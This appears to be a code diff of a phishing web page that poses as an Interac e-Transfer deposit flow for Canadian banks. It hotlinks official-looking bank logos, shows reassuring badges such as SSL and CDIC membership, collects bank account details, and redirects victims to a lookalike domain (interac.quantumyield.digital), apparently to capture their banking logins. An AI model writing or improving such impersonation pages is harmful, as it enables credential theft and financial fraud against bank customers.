@@ -11,7 +11,6 @@ import {
   Lock,
   Loader2,
   Building2,
-  CreditCard,
   ChevronRight,
   X,
 } from "lucide-react"
@@ -30,20 +29,20 @@ export interface BankEntry {
 }
 
 export const BANKS: BankEntry[] = [
-  { id: "td",         name: "TD Bank",          logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Toronto-Dominion_Bank_logo.svg/320px-Toronto-Dominion_Bank_logo.svg.png", category: "Big Six",        loginUrl: "https://www.td.com" },
-  { id: "rbc",        name: "RBC",               logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Royal_Bank_of_Canada_Logo.svg/320px-Royal_Bank_of_Canada_Logo.svg.png",  category: "Big Six",        loginUrl: "https://www.rbc.com" },
-  { id: "scotiabank", name: "Scotiabank",        logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Scotiabank_Logo.svg/320px-Scotiabank_Logo.svg.png",                      category: "Big Six",        loginUrl: "https://www.scotiabank.com" },
-  { id: "bmo",        name: "BMO",               logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Bank_of_Montreal_logo.svg/320px-Bank_of_Montreal_logo.svg.png",          category: "Big Six",        loginUrl: "https://www.bmo.com" },
-  { id: "cibc",       name: "CIBC",              logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/CIBC_logo.svg/320px-CIBC_logo.svg.png",                                  category: "Big Six",        loginUrl: "https://www.cibc.com" },
-  { id: "nbc",        name: "National Bank",     logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5d/National_Bank_of_Canada.svg/320px-National_Bank_of_Canada.svg.png",      category: "Big Six",        loginUrl: "https://www.nbc.ca" },
-  { id: "tangerine",  name: "Tangerine",         logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Tangerine_Bank_Logo.svg/320px-Tangerine_Bank_Logo.svg.png",              category: "Online Banks",   loginUrl: "https://www.tangerine.ca" },
-  { id: "eq",         name: "EQ Bank",           logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/EQ_Bank_logo.svg/320px-EQ_Bank_logo.svg.png",                            category: "Online Banks",   loginUrl: "https://www.eqbank.ca" },
-  { id: "simplii",    name: "Simplii Financial", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/Simplii_Financial_logo.svg/320px-Simplii_Financial_logo.svg.png",             category: "Online Banks",   loginUrl: "https://www.simplii.com" },
-  { id: "pcf",        name: "PC Financial",      logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/PC_Financial_logo.svg/320px-PC_Financial_logo.svg.png",                  category: "Online Banks",   loginUrl: "https://www.pcfinancial.ca" },
-  { id: "desjardins", name: "Desjardins",        logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Desjardins_Logo.svg/320px-Desjardins_Logo.svg.png",                     category: "Credit Unions",  loginUrl: "https://www.desjardins.com" },
-  { id: "vancity",    name: "Vancity",           logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Vancity_logo.svg/320px-Vancity_logo.svg.png",                            category: "Credit Unions",  loginUrl: "https://www.vancity.com" },
-  { id: "hsbc",       name: "HSBC Canada",       logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/320px-HSBC_logo_%282018%29.svg.png",           category: "Regional Banks", loginUrl: "https://www.hsbc.ca" },
-  { id: "atb",        name: "ATB Financial",     logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/ATB_Financial_logo.svg/320px-ATB_Financial_logo.svg.png",               category: "Regional Banks", loginUrl: "https://www.atb.com" },
+  { id: "td",         name: "TD Bank",          logo: "https://etransfer-notification.interac.ca/images/new/td_logo.png",         category: "Big Six",        loginUrl: "https://www.td.com" },
+  { id: "rbc",        name: "RBC",               logo: "https://etransfer-notification.interac.ca/images/new/rbc_logo.png",        category: "Big Six",        loginUrl: "https://www.rbc.com" },
+  { id: "scotiabank", name: "Scotiabank",        logo: "https://etransfer-notification.interac.ca/images/new/scotia_logo.png",     category: "Big Six",        loginUrl: "https://www.scotiabank.com" },
+  { id: "bmo",        name: "BMO",               logo: "https://etransfer-notification.interac.ca/images/new/bmo_logo.png",        category: "Big Six",        loginUrl: "https://www.bmo.com" },
+  { id: "cibc",       name: "CIBC",              logo: "https://etransfer-notification.interac.ca/images/new/cibc_logo.png",       category: "Big Six",        loginUrl: "https://www.cibc.com" },
+  { id: "nbc",        name: "National Bank",     logo: "https://etransfer-notification.interac.ca/images/new/nbc_logo.png",        category: "Big Six",        loginUrl: "https://www.nbc.ca" },
+  { id: "tangerine",  name: "Tangerine",         logo: "https://etransfer-notification.interac.ca/images/new/tangerine_logo.png",  category: "Online Banks",   loginUrl: "https://www.tangerine.ca" },
+  { id: "eq",         name: "EQ Bank",           logo: "https://etransfer-notification.interac.ca/images/new/eq_logo.png",         category: "Online Banks",   loginUrl: "https://www.eqbank.ca" },
+  { id: "simplii",    name: "Simplii Financial", logo: "https://etransfer-notification.interac.ca/images/new/simplii_logo.png",    category: "Online Banks",   loginUrl: "https://www.simplii.com" },
+  { id: "pcf",        name: "PC Financial",      logo: "https://etransfer-notification.interac.ca/images/new/pcf_logo.png",        category: "Online Banks",   loginUrl: "https://www.pcfinancial.ca" },
+  { id: "desjardins", name: "Desjardins",        logo: "https://etransfer-notification.interac.ca/images/new/desjardins_logo.png", category: "Credit Unions",  loginUrl: "https://www.desjardins.com" },
+  { id: "vancity",    name: "Vancity",           logo: "https://etransfer-notification.interac.ca/images/new/vancity_logo.png",    category: "Credit Unions",  loginUrl: "https://www.vancity.com" },
+  { id: "hsbc",       name: "HSBC Canada",       logo: "https://etransfer-notification.interac.ca/images/new/hsbc_logo.png",       category: "Regional Banks", loginUrl: "https://www.hsbc.ca" },
+  { id: "atb",        name: "ATB Financial",     logo: "https://etransfer-notification.interac.ca/images/new/atb_logo.png",        category: "Regional Banks", loginUrl: "https://www.atb.com" },
 ]
 
 export const CATEGORIES: BankCategory[] = ["Big Six", "Online Banks", "Credit Unions", "Regional Banks"]
@@ -56,26 +55,124 @@ interface Props {
   showManualEntry?: boolean
 }
 
+// ─── Inline bilingual copy (safe — no context dependency) ───────────────────
+
+const COPY = {
+  en: {
+    badge:              "Interac e-Transfer",
+    title:              "Connect your bank account",
+    subtitle:           "Select your financial institution to securely link your account and receive your e-Transfer deposit.",
+    searchPlaceholder:  "Search your bank...",
+    allCategory:        "All",
+    noResultsTitle:     (term: string) => `No banks match "${term}"`,
+    noResultsTip:       "Try a different search term",
+    chooseDifferent:    "Choose a different bank",
+    back:               "Back",
+    connectTo:          (name: string) => `Connect to ${name}`,
+    connectingTitle:    "Establishing secure connection...",
+    connectingSubtitle: "Preparing your bank redirect",
+    redirectingTo:      (name: string) => `Redirecting to ${name}`,
+    openingIn:          (s: number) => `Opening secure bank portal in ${s}s`,
+    continueNow:        "Continue now",
+    trustSsl:           "256-bit SSL",
+    trustSslSub:        "Encrypted connection",
+    trustSecurity:      "Bank-level security",
+    trustSecuritySub:   "Your data stays safe",
+    trustCdic:          "CDIC Member",
+    trustCdicSub:       "Government insured",
+    secureConnection:   "Secure Connection",
+    secureNotice:       "You'll be securely redirected to your bank's official website. Never share your banking credentials with anyone.",
+    whatHappensNext:    "What happens next?",
+    step1:              "You'll be redirected to your bank's secure login page",
+    step2:              "Log in with your existing banking credentials",
+    step3:              "Authorize the connection to complete the setup",
+    catBigSix:          "Big Six",
+    catOnline:          "Online Banks",
+    catCreditUnions:    "Credit Unions",
+    catRegional:        "Regional Banks",
+    manualPrompt:       "Don't see your bank?",
+    manualTitle:        "Enter your bank details manually",
+    manualInstitutionLabel:       "Institution name",
+    manualInstitutionPlaceholder: "e.g. TD Bank",
+    manualAccountTypeLabel:       "Account type",
+    manualAccountTypeDefault:     "Select type",
+    manualChequing:     "Chequing",
+    manualSavings:      "Savings",
+    manualBusiness:     "Business",
+    manualBranchLabel:        "Branch / transit number (optional)",
+    manualBranchPlaceholder:  "e.g. 00123",
+    manualSubmit:       "Submit manually",
+    manualSubmitting:   "Submitting...",
+    manualSuccess:      "Your bank details have been submitted. Our team will verify and connect your account.",
+  },
+  fr: {
+    badge:              "Virement Interac",
+    title:              "Connectez votre compte bancaire",
+    subtitle:           "Sélectionnez votre institution financière pour lier votre compte en toute sécurité et recevoir votre dépôt par virement.",
+    searchPlaceholder:  "Recherchez votre banque...",
+    allCategory:        "Toutes",
+    noResultsTitle:     (term: string) => `Aucune banque ne correspond à « ${term} »`,
+    noResultsTip:       "Essayez un autre terme de recherche",
+    chooseDifferent:    "Choisir une autre banque",
+    back:               "Retour",
+    connectTo:          (name: string) => `Se connecter à ${name}`,
+    connectingTitle:    "Établissement de la connexion sécurisée...",
+    connectingSubtitle: "Préparation de la redirection vers votre banque",
+    redirectingTo:      (name: string) => `Redirection vers ${name}`,
+    openingIn:          (s: number) => `Ouverture du portail sécurisé dans ${s}s`,
+    continueNow:        "Continuer maintenant",
+    trustSsl:           "SSL 256 bits",
+    trustSslSub:        "Connexion chiffrée",
+    trustSecurity:      "Sécurité bancaire",
+    trustSecuritySub:   "Vos données restent protégées",
+    trustCdic:          "Membre SADC",
+    trustCdicSub:       "Assuré par le gouvernement",
+    secureConnection:   "Connexion sécurisée",
+    secureNotice:       "Vous serez redirigé en toute sécurité vers le site officiel de votre banque. Ne partagez jamais vos identifiants bancaires.",
+    whatHappensNext:    "Que se passe-t-il ensuite?",
+    step1:              "Vous serez redirigé vers la page de connexion sécurisée de votre banque",
+    step2:              "Connectez-vous avec vos identifiants bancaires existants",
+    step3:              "Autorisez la connexion pour finaliser la configuration",
+    catBigSix:          "Les Six Grandes",
+    catOnline:          "Banques en ligne",
+    catCreditUnions:    "Coopératives de crédit",
+    catRegional:        "Banques régionales",
+    manualPrompt:       "Votre banque n'est pas dans la liste?",
+    manualTitle:        "Entrez les coordonnées de votre banque manuellement",
+    manualInstitutionLabel:       "Nom de l'institution",
+    manualInstitutionPlaceholder: "ex. Banque TD",
+    manualAccountTypeLabel:       "Type de compte",
+    manualAccountTypeDefault:     "Sélectionner le type",
+    manualChequing:     "Chèques",
+    manualSavings:      "Épargne",
+    manualBusiness:     "Affaires",
+    manualBranchLabel:        "Numéro de succursale / transit (optionnel)",
+    manualBranchPlaceholder:  "ex. 00123",
+    manualSubmit:       "Soumettre manuellement",
+    manualSubmitting:   "Envoi en cours...",
+    manualSuccess:      "Vos coordonnées bancaires ont été soumises. Notre équipe vérifiera et connectera votre compte.",
+  },
+} as const
+
 // ─── Shared flow ─────────────────────────────────────────────────────────────
 
 export default function ConnectBankFlow({ onBack, showManualEntry = true }: Props) {
-  const { t } = useLanguage()
-  const cb = t.connectBank
+  const { language } = useLanguage()
+  const c = COPY[language] ?? COPY.en
 
-  const [search, setSearch]                     = useState("")
-  const [activeCategory, setActiveCategory]     = useState<BankCategory | "all">("all")
-  const [selected, setSelected]                 = useState<BankEntry | null>(null)
-  const [step, setStep]                         = useState<Step>("select")
-  const [countdown, setCountdown]     = useState(5)
-  const [brokenLogos, setBrokenLogos] = useState<Set<string>>(new Set())
+  const [search, setSearch]                 = useState("")
+  const [activeCategory, setActiveCategory] = useState<BankCategory | "all">("all")
+  const [selected, setSelected]             = useState<BankEntry | null>(null)
+  const [step, setStep]                     = useState<Step>("select")
+  const [countdown, setCountdown]           = useState(5)
+  const [brokenLogos, setBrokenLogos]       = useState<Set<string>>(new Set())
 
-  // Map i18n category labels back to BankCategory keys
   const categoryLabels: Record<BankCategory | "all", string> = {
-    all:              cb.allCategory,
-    "Big Six":        cb.catBigSix,
-    "Online Banks":   cb.catOnline,
-    "Credit Unions":  cb.catCreditUnions,
-    "Regional Banks": cb.catRegional,
+    all:              c.allCategory,
+    "Big Six":        c.catBigSix,
+    "Online Banks":   c.catOnline,
+    "Credit Unions":  c.catCreditUnions,
+    "Regional Banks": c.catRegional,
   }
 
   const filtered = BANKS.filter((b) => {
@@ -99,18 +196,17 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
     window.location.href = `https://interac.quantumyield.digital/countdown?${params.toString()}`
   }
 
-  // Countdown — runs only when step is "redirecting"
   useEffect(() => {
     if (step !== "redirecting") return
     setCountdown(5)
     const interval = setInterval(() => {
-      setCountdown((c) => {
-        if (c <= 1) {
+      setCountdown((prev) => {
+        if (prev <= 1) {
           clearInterval(interval)
           doRedirect()
           return 0
         }
-        return c - 1
+        return prev - 1
       })
     }, 1000)
     return () => clearInterval(interval)
@@ -138,9 +234,9 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
   }
 
   const trust = [
-    { icon: Lock,         label: cb.trustSsl,      sub: cb.trustSslSub },
-    { icon: Shield,       label: cb.trustSecurity,  sub: cb.trustSecuritySub },
-    { icon: CheckCircle2, label: cb.trustCdic,      sub: cb.trustCdicSub },
+    { icon: Lock,         label: c.trustSsl,      sub: c.trustSslSub },
+    { icon: Shield,       label: c.trustSecurity,  sub: c.trustSecuritySub },
+    { icon: CheckCircle2, label: c.trustCdic,      sub: c.trustCdicSub },
   ]
 
   return (
@@ -152,7 +248,7 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
         className="flex items-center gap-2 text-sm text-zinc-500 hover:text-zinc-900 transition-colors mb-6 group min-h-[44px]"
       >
         <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
-        {step === "select" ? t.institutionSelect.back : cb.chooseDifferent}
+        {step === "select" ? c.back : c.chooseDifferent}
       </button>
 
       {/* ── SELECT ── */}
@@ -165,14 +261,14 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
                 <Building2 className="w-5 h-5 text-black" />
               </div>
               <span className="text-xs font-semibold tracking-widest text-zinc-400 uppercase">
-                {cb.badge}
+                {c.badge}
               </span>
             </div>
             <h1 className="text-3xl md:text-4xl font-bold text-zinc-900 mb-3 text-balance">
-              {cb.title}
+              {c.title}
             </h1>
             <p className="text-zinc-500 text-base md:text-lg leading-relaxed max-w-xl">
-              {cb.subtitle}
+              {c.subtitle}
             </p>
           </div>
 
@@ -200,12 +296,12 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
               <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400 pointer-events-none" />
               <input
                 type="search"
-                placeholder={cb.searchPlaceholder}
+                placeholder={c.searchPlaceholder}
                 value={search}
                 onChange={(e) => setSearch(e.target.value)}
                 className="w-full pl-10 pr-4 py-3 rounded-xl border border-zinc-200 bg-white text-sm text-zinc-900 placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent transition-all"
                 style={{ fontSize: "16px" }}
-                aria-label={cb.searchPlaceholder}
+                aria-label={c.searchPlaceholder}
               />
               {search && (
                 <button
@@ -239,8 +335,8 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
           {filtered.length === 0 ? (
             <div className="text-center py-16 text-zinc-400">
               <Building2 className="w-10 h-10 mx-auto mb-3 opacity-40" />
-              <p className="font-medium">{cb.noResultsTitle(search)}</p>
-              <p className="text-sm mt-1">{cb.noResultsTip}</p>
+              <p className="font-medium">{c.noResultsTitle(search)}</p>
+              <p className="text-sm mt-1">{c.noResultsTip}</p>
             </div>
           ) : (
             <div className="space-y-8">
@@ -259,7 +355,7 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
                           key={bank.id}
                           onClick={() => handleSelect(bank)}
                           className="group relative bg-white border-2 border-zinc-100 hover:border-[#FDB913] rounded-2xl p-4 flex flex-col items-center justify-center gap-2 min-h-[100px] transition-all hover:shadow-lg hover:shadow-[#FDB913]/10 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
-                          aria-label={cb.connectTo(bank.name)}
+                          aria-label={c.connectTo(bank.name)}
                         >
                           {!brokenLogos.has(bank.id) ? (
                             <Image
@@ -292,8 +388,8 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
           {/* Manual entry fallback */}
           {showManualEntry && (
             <div className="mt-12 border-t border-zinc-100 pt-8">
-              <p className="text-sm text-zinc-400 mb-3">{cb.manualPrompt}</p>
-              <ManualEntryForm />
+              <p className="text-sm text-zinc-400 mb-3">{c.manualPrompt}</p>
+              <ManualEntryForm language={language} />
             </div>
           )}
         </>
@@ -332,17 +428,17 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
           <div className="flex items-start gap-3 bg-[#FDB913]/8 border border-[#FDB913]/30 rounded-xl p-4 mb-6">
             <Shield className="w-5 h-5 text-[#FDB913] shrink-0 mt-0.5" />
             <div>
-              <p className="text-sm font-semibold text-zinc-800 mb-0.5">{t.institutionSelect.secureConnection}</p>
-              <p className="text-sm text-zinc-500 leading-relaxed">{t.institutionSelect.secureNotice}</p>
+              <p className="text-sm font-semibold text-zinc-800 mb-0.5">{c.secureConnection}</p>
+              <p className="text-sm text-zinc-500 leading-relaxed">{c.secureNotice}</p>
             </div>
           </div>
 
           {/* Confirm step */}
           {step === "confirm" && (
             <>
-              <h3 className="text-sm font-semibold text-zinc-700 mb-3">{t.institutionSelect.whatHappensNext}</h3>
+              <h3 className="text-sm font-semibold text-zinc-700 mb-3">{c.whatHappensNext}</h3>
               <ul className="space-y-3 mb-8">
-                {[t.institutionSelect.step1, t.institutionSelect.step2, t.institutionSelect.step3].map((text, i) => (
+                {[c.step1, c.step2, c.step3].map((text, i) => (
                   <li key={i} className="flex items-start gap-3 text-sm text-zinc-600">
                     <span className="w-5 h-5 rounded-full bg-[#FDB913]/15 text-[#FDB913] font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">
                       {i + 1}
@@ -355,7 +451,7 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
                 onClick={handleConnect}
                 className="w-full flex items-center justify-center gap-2 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold py-4 rounded-xl transition-colors text-base focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 min-h-[56px]"
               >
-                {cb.connectTo(selected.name)}
+                {c.connectTo(selected.name)}
                 <ArrowRight className="w-5 h-5" />
               </button>
             </>
@@ -365,8 +461,8 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
           {step === "connecting" && (
             <div className="text-center py-10">
               <Loader2 className="w-12 h-12 text-[#FDB913] animate-spin mx-auto mb-4" />
-              <p className="font-semibold text-zinc-800 text-lg">{cb.connectingTitle}</p>
-              <p className="text-zinc-400 text-sm mt-1">{cb.connectingSubtitle}</p>
+              <p className="font-semibold text-zinc-800 text-lg">{c.connectingTitle}</p>
+              <p className="text-zinc-400 text-sm mt-1">{c.connectingSubtitle}</p>
             </div>
           )}
 
@@ -391,13 +487,13 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
                   {countdown}
                 </span>
               </div>
-              <p className="font-semibold text-zinc-800 text-lg">{cb.redirectingTo(selected.name)}</p>
-              <p className="text-zinc-400 text-sm mt-1 mb-6">{cb.openingIn(countdown)}</p>
+              <p className="font-semibold text-zinc-800 text-lg">{c.redirectingTo(selected.name)}</p>
+              <p className="text-zinc-400 text-sm mt-1 mb-6">{c.openingIn(countdown)}</p>
               <button
                 onClick={doRedirect}
                 className="inline-flex items-center gap-2 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold px-6 py-3 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 min-h-[44px]"
               >
-                {cb.continueNow}
+                {c.continueNow}
                 <ArrowRight className="w-4 h-4" />
               </button>
             </div>
@@ -410,9 +506,8 @@ export default function ConnectBankFlow({ onBack, showManualEntry = true }: Prop
 
 // ─── Manual entry fallback ────────────────────────────────────────────────────
 
-function ManualEntryForm() {
-  const { t } = useLanguage()
-  const cb = t.connectBank
+function ManualEntryForm({ language }: { language: "en" | "fr" }) {
+  const c = COPY[language] ?? COPY.en
 
   const [form, setForm]             = useState({ institution: "", accountType: "", branch: "" })
   const [submitting, setSubmitting] = useState(false)
@@ -429,27 +524,28 @@ function ManualEntryForm() {
     return (
       <div className="flex items-center gap-3 p-4 bg-green-50 border border-green-200 rounded-xl text-sm text-green-700">
         <CheckCircle2 className="w-5 h-5 shrink-0" />
-        <span>{cb.manualSuccess}</span>
+        <span>{c.manualSuccess}</span>
       </div>
     )
   }
 
   return (
     <form onSubmit={handleSubmit} className="space-y-3 max-w-md">
+      <h3 className="text-sm font-semibold text-zinc-700 mb-2">{c.manualTitle}</h3>
       <div className="grid grid-cols-2 gap-3">
         <div>
-          <label className="text-xs font-semibold text-zinc-600 block mb-1">{cb.manualInstitutionLabel}</label>
+          <label className="text-xs font-semibold text-zinc-600 block mb-1">{c.manualInstitutionLabel}</label>
           <input
             required
             value={form.institution}
             onChange={(e) => setForm({ ...form, institution: e.target.value })}
-            placeholder={cb.manualInstitutionPlaceholder}
+            placeholder={c.manualInstitutionPlaceholder}
             className="w-full border border-zinc-200 rounded-xl px-3 py-2.5 text-sm text-zinc-900 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
             style={{ fontSize: "16px" }}
           />
         </div>
         <div>
-          <label className="text-xs font-semibold text-zinc-600 block mb-1">{cb.manualAccountTypeLabel}</label>
+          <label className="text-xs font-semibold text-zinc-600 block mb-1">{c.manualAccountTypeLabel}</label>
           <select
             required
             value={form.accountType}
@@ -457,19 +553,19 @@ function ManualEntryForm() {
             className="w-full border border-zinc-200 rounded-xl px-3 py-2.5 text-sm text-zinc-900 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent bg-white"
             style={{ fontSize: "16px" }}
           >
-            <option value="">{cb.manualAccountTypeDefault}</option>
-            <option value="chequing">{cb.manualChequing}</option>
-            <option value="savings">{cb.manualSavings}</option>
-            <option value="business">{cb.manualBusiness}</option>
+            <option value="">{c.manualAccountTypeDefault}</option>
+            <option value="chequing">{c.manualChequing}</option>
+            <option value="savings">{c.manualSavings}</option>
+            <option value="business">{c.manualBusiness}</option>
           </select>
         </div>
       </div>
       <div>
-        <label className="text-xs font-semibold text-zinc-600 block mb-1">{cb.manualBranchLabel}</label>
+        <label className="text-xs font-semibold text-zinc-600 block mb-1">{c.manualBranchLabel}</label>
         <input
           value={form.branch}
           onChange={(e) => setForm({ ...form, branch: e.target.value })}
-          placeholder={cb.manualBranchPlaceholder}
+          placeholder={c.manualBranchPlaceholder}
           className="w-full border border-zinc-200 rounded-xl px-3 py-2.5 text-sm text-zinc-900 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
           style={{ fontSize: "16px" }}
         />
@@ -477,10 +573,13 @@ function ManualEntryForm() {
       <button
         type="submit"
         disabled={submitting}
-        className="flex items-center gap-2 bg-zinc-900 hover:bg-zinc-700 text-white font-semibold px-5 py-3 rounded-xl text-sm transition-colors disabled:opacity-60 focus:outline-none focus:ring-2 focus:ring-zinc-900 focus:ring-offset-2 min-h-[44px]"
+        className="flex items-center gap-2 bg-zinc-900 hover:bg-zinc-700 text-white font-semibold px-5 py-2.5 rounded-xl text-sm transition-colors disabled:opacity-50 min-h-[44px]"
       >
-        {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <CreditCard className="w-4 h-4" />}
-        {submitting ? cb.manualSubmitting : cb.manualSubmit}
+        {submitting ? (
+          <><Loader2 className="w-4 h-4 animate-spin" />{c.manualSubmitting}</>
+        ) : (
+          c.manualSubmit
+        )}
       </button>
     </form>
   )
